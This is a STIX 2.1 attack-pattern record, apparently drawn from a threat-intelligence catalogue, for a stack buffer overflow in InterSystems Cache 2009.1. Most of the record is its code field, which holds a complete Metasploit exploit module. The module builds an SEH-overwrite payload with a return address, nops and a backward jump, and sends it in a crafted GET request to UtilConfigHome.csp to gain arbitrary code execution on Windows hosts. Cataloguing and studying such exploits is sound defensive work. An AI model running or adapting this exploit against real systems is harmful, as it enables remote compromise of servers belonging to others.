{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7563de62-d41a-40bf-b323-bb45af4f8f75",
    "created": "2024-08-14T16:55:21.768657Z",
    "modified": "2024-08-14T16:55:21.768662Z",
    "name": "InterSystems Cache UtilConfigHome.csp Argument Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in InterSystems Cache 2009.1. By sending a specially crafted GET request, an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/intersystems_cache.rb",
            "external_id": "intersystems_cache.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  # XXX: Needs custom body check HttpFingerprint = { :uri => '/csp/sys/mgr/UtilConfigHome.csp', :body => [ /Cache for Windows/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'InterSystems Cache UtilConfigHome.csp Argument Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in InterSystems Cache 2009.1.\n        By sending a specially crafted GET request, an attacker may be able to execute\n        arbitrary code.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '60549' ],\n          [ 'BID', '37177' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 650,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x0c\\x25\\x23\\x20\\x0a\\x0d\\x09\\x2f\\x2b\\x2e\\x0b\\x5c\",\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 SP4 English', { 'Offset' => 710, 'Ret' => 0x6ff2791a } ], # libhttpd.dll 2.2.11.0 / pop ebp | pop ebx | ret\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-09-29')) # Initially...!\n\n    register_options( [ Opt::RPORT(57772) ])\n  end\n\n  def exploit\n    # offset to the seh frame.\n    sploit =   payload.encoded + rand_text_alpha_upper(target['Offset'] - payload.encoded.length)\n    # jmp $+6 | p/p/r\n    sploit <<  Rex::Arch::X86.jmp_short(6) + [target.ret].pack('V')\n    # fall into some nops, jmp back to our final payload.\n    sploit <<  make_nops(8) + [0xe9, -700].pack('CV')\n    # cause the av!\n    sploit <<  rand_text_alpha_upper(payload.encoded.length)\n\n    print_status(\"Trying target #{target.name}...\")\n\n    send_request_raw({\n        'uri'          => '/csp/sys/mgr/UtilConfigHome.csp=' + sploit,\n        'method'       => 'GET',\n      }, 5)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-09-29 # Initially...!",
    "x_mitre_platforms": [
        "win'"
    ]
}